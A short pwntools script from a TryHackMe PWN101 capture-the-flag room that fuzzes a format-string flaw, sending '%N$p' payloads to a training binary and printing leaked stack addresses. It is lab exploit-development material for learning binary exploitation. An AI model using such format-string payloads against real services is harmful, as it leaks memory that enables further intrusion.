#!/usr/bin/python3

# TryHackMe - Room PWN101 - Challenge 7 - Address Fuzzer

from pwn import *
context.log_level = 'warning'

host = "10.10.10.10"
port = 9007

executable = './107'

for i in range(2, 20):
    for j in range(5):
        #io = remote(host, port)
        io = process(executable)

        payload = ("%" + str(i) + "$p").encode()
        io.sendlineafter(b"THM: What's your last streak? ", payload)
        io.recvuntil(b'Your current streak: ')

        # Leaked memory positions
        leaked = io.recvline().decode().strip()
        print("Leakedy address: " + leaked)

        io.close()
    print("Index:", i, "\n\n")

